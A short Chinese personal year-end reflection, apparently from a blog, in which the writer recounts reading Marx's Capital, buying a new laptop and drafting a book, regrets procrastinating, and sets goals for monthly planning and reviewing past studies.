-<p>最后要将的一本书就是《马克思资本论》这是一本对我来说很重要的书，里面的知识过于干，对我而言很难吸收，但就算如此我也依然有决心想要看完这本书，这应该是我头一次思考很久的书，基本上每读一章就要思考很久，所以新的一年继续坚持读。</p>
-<p>因为学校电脑卡顿，购置了新的笔记本，很开心。</p>
-<p>计划写一本书，目前只完成了20%有六万字左右，希望有一天写完后能打印出来。</p>
-<p>遗憾方面，自己浪费了很多时间，不够自律，人机关系处理的也不够好，明明有很多计划，但是每当施行的时候总是因为懒惰半途而废。</p>
-<p>新的一年的目标，嗯….</p>
-<p>首先这一年我希望不要让计划停留在构思阶段，而是有所进展，并且每个月都罗列出计划表，鼓励和鞭策自己完成计划，或者出现纰漏后修改再继续执行。</p>
-<p>对之前所学的内容进行复习，可以有所新的领悟。</p>
 
                 
             </div>
